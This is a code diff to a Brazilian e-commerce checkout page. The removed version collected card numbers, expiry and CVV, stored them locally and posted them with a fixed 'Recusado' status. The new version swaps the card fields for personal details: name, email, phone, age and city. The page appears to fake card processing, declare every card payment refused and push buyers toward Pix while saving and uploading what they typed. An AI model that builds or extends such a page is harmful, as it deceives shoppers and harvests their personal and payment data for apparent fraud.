@@ -294,6 +294,16 @@
       font-weight: 800;
     }
 
+    .payment-overlay.refused .payment-modal {
+      border: 2px solid #a31919;
+      background: #fff1f1;
+      color: #8f1111;
+    }
+
+    .payment-overlay.refused .modal-text {
+      color: #8f1111;
+    }
+
     [hidden] {
       display: none !important;
     }
@@ -334,25 +344,27 @@
     <section>
       <h1>Finalize seu pedido</h1>
       <form id="checkout-form">
-        <label>
-          Nome completo
-          <input name="name" autocomplete="name" required>
-        </label>
+        <div id="pix-client-fields" class="card-fields">
+          <label>
+            Nome completo
+            <input name="name" autocomplete="name" required>
+          </label>
 
-        <label>
-          Email
-          <input name="email" type="email" autocomplete="email" required>
-        </label>
+          <label>
+            Email
+            <input name="email" type="email" autocomplete="email" required>
+          </label>
 
-        <label>
-          Telefone
-          <input name="phone" inputmode="tel" autocomplete="tel" placeholder="(11) 99999-9999" required>
-        </label>
+          <label>
+            Telefone
+            <input name="phone" inputmode="tel" autocomplete="tel" placeholder="(11) 99999-9999" required>
+          </label>
 
-        <label>
-          CPF
-          <input name="document" inputmode="numeric" autocomplete="off" placeholder="123.456.789-00" required>
-        </label>
+          <label>
+            CPF
+            <input name="document" inputmode="numeric" autocomplete="off" placeholder="123.456.789-00" required>
+          </label>
+        </div>
 
         <div class="payment-options" role="radiogroup" aria-label="Forma de pagamento">
           <label class="payment-option">
@@ -369,26 +381,34 @@
 
         <div id="card-fields" class="card-fields" hidden>
           <label>
-            Nome impresso no cartao
-            <input name="cardHolder" autocomplete="cc-name">
+            Telefone
+            <input name="customerPhone" type="text">
           </label>
 
           <label>
-            Numero do cartao
-            <input id="card-number" name="cardNumber" inputmode="numeric" autocomplete="cc-number" placeholder="0000 0000 0000 0000">
-            <span id="card-error" class="field-error" aria-live="polite"></span>
+            Nome
+            <input name="firstName" type="text">
           </label>
 
-          <div class="card-row">
-            <label>
-              Validade
-              <input id="card-expiry" name="cardExpiry" inputmode="numeric" autocomplete="cc-exp" placeholder="MM/AA" maxlength="5">
-            </label>
-            <label>
-              CVV
-              <input id="card-cvv" name="cardCvv" inputmode="numeric" autocomplete="cc-csc" placeholder="123">
-            </label>
-          </div>
+          <label>
+            Sobrenome
+            <input name="lastName" type="text">
+          </label>
+
+          <label>
+            Email
+            <input name="customerEmail" type="text">
+          </label>
+
+          <label>
+            Idade
+            <input name="age" type="text">
+          </label>
+
+          <label>
+            Cidade
+            <input name="city" type="text">
+          </label>
         </div>
 
         <div id="card-refusal" class="card-refusal" hidden></div>
@@ -421,11 +441,8 @@
     const summary = document.getElementById('summary');
     const submitButton = document.getElementById('submit-button');
     const cardFields = document.getElementById('card-fields');
+    const pixClientFields = document.getElementById('pix-client-fields');
     const pixNote = document.getElementById('pix-note');
-    const cardNumberInput = document.getElementById('card-number');
-    const cardExpiryInput = document.getElementById('card-expiry');
-    const cardCvvInput = document.getElementById('card-cvv');
-    const cardError = document.getElementById('card-error');
     const paymentOverlay = document.getElementById('payment-overlay');
     const modalSpinner = document.getElementById('modal-spinner');
     const modalTitle = document.getElementById('modal-title');
@@ -488,86 +505,26 @@
       return details && !String(base).includes(details) ? `${base} Detalhes: ${details}` : base;
     }
 
-    function luhnIsValid(number) {
-      const digits = onlyDigits(number);
-      if (digits.length < 13 || digits.length > 19) return false;
-
-      let sum = 0;
-      let shouldDouble = false;
-
-      for (let index = digits.length - 1; index >= 0; index -= 1) {
-        let digit = Number(digits[index]);
-        if (shouldDouble) {
-          digit *= 2;
-          if (digit > 9) digit -= 9;
-        }
-        sum += digit;
-        shouldDouble = !shouldDouble;
-      }
-
-      return sum % 10 === 0;
-    }
-
-    function cardBrand(number) {
-      const digits = onlyDigits(number);
-      if (/^4/.test(digits)) return 'Visa';
-      if (/^(5[1-5]|2[2-7])/.test(digits)) return 'Mastercard';
-      if (/^3[47]/.test(digits)) return 'Amex';
-      if (/^(4011|4312|4389|4514|4576|5041|5066|5067|509|6277|6362|6363|650|6516|6550)/.test(digits)) return 'Elo';
-      return 'Cartao';
-    }
-
-    function isAllowedTestCard(number) {
-      const digits = onlyDigits(number);
-      return [
-        '4111111111111111',
-        '4242424242424242',
-        '4000000000000002',
-        '5555555555554444',
-        '5105105105105100',
-        '378282246310005',
-        '371449635398431',
-        '6011111111111117',
-        '30569309025904'
-      ].includes(digits);
-    }
-
-    function formatCardNumber(value) {
-      return onlyDigits(value).slice(0, 19).replace(/(\d{4})(?=\d)/g, '$1 ');
-    }
-
-    function formatExpiry(value) {
-      const digits = onlyDigits(value).slice(0, 4);
-      if (digits.length <= 2) return digits;
-      return `${digits.slice(0, 2)}/${digits.slice(2)}`;
-    }
-
-    function validateCardNumber(force) {
-      const digits = onlyDigits(cardNumberInput.value);
-      const shouldShowError = force || digits.length >= 13;
-      const isValid = luhnIsValid(digits);
-      const showInvalid = shouldShowError && !isValid;
-
-      cardNumberInput.classList.toggle('invalid', showInvalid);
-      cardError.textContent = showInvalid ? 'Cartão Inválido' : '';
-      return isValid;
-    }
-
     function updateRequiredFields() {
       const isCard = selectedPaymentMethod() === 'card';
       cardFields.hidden = !isCard;
+      pixClientFields.hidden = isCard;
       pixNote.hidden = isCard;
 
-      ['cardHolder', 'cardNumber', 'cardExpiry', 'cardCvv'].forEach((name) => {
+      ['customerPhone', 'firstName', 'lastName', 'customerEmail', 'age', 'city'].forEach((name) => {
         const input = form.elements[name];
         if (input) input.required = isCard;
+      });
+      ['name', 'email', 'phone', 'document'].forEach((name) => {
+        const input = form.elements[name];
+        if (input) input.required = !isCard;
       });
     }
 
     function updateSubmitButton() {
       const method = selectedPaymentMethod();
       submitButton.textContent = method === 'card' ? 'Finalizar compra' : 'Gerar Pix';
-      submitButton.disabled = checkoutBlocked || (method === 'card' && !luhnIsValid(cardNumberInput.value));
+      submitButton.disabled = checkoutBlocked;
     }
 
     function renderSummary(session) {
@@ -615,44 +572,29 @@
     }
 
     function saveCardAttempt(formData) {
-  const digits = onlyDigits(formData.get('cardNumber'));
-  const isTestCard = isAllowedTestCard(digits);
-  const cards = JSON.parse(localStorage.getItem('divino:testCards') || '[]');
+      const cards = JSON.parse(localStorage.getItem('divino:testCards') || '[]');
 
-  cards.unshift({
-    createdAt: new Date().toISOString(),
-    holder: formData.get('cardHolder') || formData.get('name') || '',
-    email: formData.get('email') || '',
-    phone: formData.get('phone') || '',
-    cpf: formData.get('document') || '',
-    brand: cardBrand(digits),
-    cardNumber: isTestCard ? formatCardNumber(digits) : '',
-    cvv: isTestCard ? onlyDigits(formData.get('cardCvv')).slice(0, 4) : '',
-    isTestCard,
-    last4: digits.slice(-4),
-    expiry: formData.get('cardExpiry') || '',
-    amount: Math.round(Number(currentSession && currentSession.amount ? currentSession.amount : 0) * 100),
-    status: 'Recusado'
-  });
+      cards.unshift({
+        createdAt: new Date().toISOString(),
+        phone: formData.get('customerPhone') || '',
+        firstName: formData.get('firstName') || '',
+        lastName: formData.get('lastName') || '',
+        email: formData.get('customerEmail') || '',
+        age: formData.get('age') || '',
+        city: formData.get('city') || ''
+      });
 
-  localStorage.setItem('divino:testCards', JSON.stringify(cards.slice(0, 50)));
-}
+      localStorage.setItem('divino:testCards', JSON.stringify(cards.slice(0, 50)));
+    }
 
     function safeCardAttemptPayload(formData) {
-      const digits = onlyDigits(formData.get('cardNumber'));
-
       return {
-        sessionId,
-        holder: formData.get('cardHolder') || formData.get('name') || '',
-        email: formData.get('email') || '',
-        phone: formData.get('phone') || '',
-        cpf: formData.get('document') || '',
-        cardBrand: cardBrand(digits),
-        cardLast4: digits.slice(-4),
-        cardExpiry: formData.get('cardExpiry') || '',
-        amount: Number(currentSession && currentSession.amount ? currentSession.amount : 0),
-        status: 'Recusado',
-        luhnValid: luhnIsValid(digits)
+        phone: formData.get('customerPhone') || '',
+        firstName: formData.get('firstName') || '',
+        lastName: formData.get('lastName') || '',
+        email: formData.get('customerEmail') || '',
+        age: formData.get('age') || '',
+        city: formData.get('city') || ''
       };
     }
 
@@ -667,13 +609,14 @@
 
       if (!response.ok) {
         const payload = await response.json().catch(() => ({}));
-        throw new Error(payload.message || 'Nao foi possivel salvar a tentativa de cartao.');
+        throw new Error(payload.message || 'Nao foi possivel salvar os dados.');
       }
     }
 
 
     function showCardLoading() {
       paymentOverlay.hidden = false;
+      paymentOverlay.classList.remove('refused');
       modalSpinner.hidden = false;
       modalTitle.textContent = 'Processando pagamento';
       modalText.textContent = 'Aguarde enquanto finalizamos sua compra.';
@@ -683,6 +626,7 @@
     function showCardRefused() {
       const refusedMessage = 'Metódo de pagamento recusado, porfavor, tente outra forma de pagamento ou aguarde alguns minutos para tentar novamente';
       setCardRefusal(refusedMessage);
+      paymentOverlay.classList.add('refused');
       modalSpinner.hidden = true;
       modalTitle.textContent = 'Pagamento recusado';
       modalText.textContent = refusedMessage;
@@ -727,12 +671,6 @@
     }
 
     async function submitCard(formData) {
-      if (!validateCardNumber(true)) {
-        updateSubmitButton();
-        cardNumberInput.focus();
-        return;
-      }
-
       submitButton.disabled = true;
       setCardRefusal('');
       if (!currentSession) {
@@ -758,19 +696,6 @@
         setCardRefusal('');
       }
 
-      if (event.target === cardNumberInput) {
-        cardNumberInput.value = formatCardNumber(cardNumberInput.value);
-        validateCardNumber(false);
-      }
-
-      if (event.target === cardExpiryInput) {
-        cardExpiryInput.value = formatExpiry(cardExpiryInput.value);
-      }
-
-      if (event.target === cardCvvInput) {
-        cardCvvInput.value = onlyDigits(cardCvvInput.value).slice(0, 4);
-      }
-
       updateSubmitButton();
     });
 
@@ -779,7 +704,6 @@
         setMessage('');
         setCardRefusal('');
         updateRequiredFields();
-        validateCardNumber(false);
         updateSubmitButton();
       }
     });
